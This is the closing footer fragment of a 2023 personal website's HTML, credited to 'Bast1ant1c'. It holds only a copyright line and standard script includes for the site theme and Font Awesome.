    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
-->
  </ul>
</div>

<div class="page__footer-copyright">&copy; 2023 Bast1ant1c</div>

      </footer>
    </div>

    
  <script src="/assets/js/main.min.js"></script>
  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.15.4/js/all.js" integrity="sha384-rOA1PnstxnOBLzCLMcre8ybwbTmemjzdNlILg8O7z1lUkLXozs4DHonlDtnE7fpc" crossorigin="anonymous"></script>
  <script src="/assets/js/codeblock.js"></script>
  







  </body>
</html>
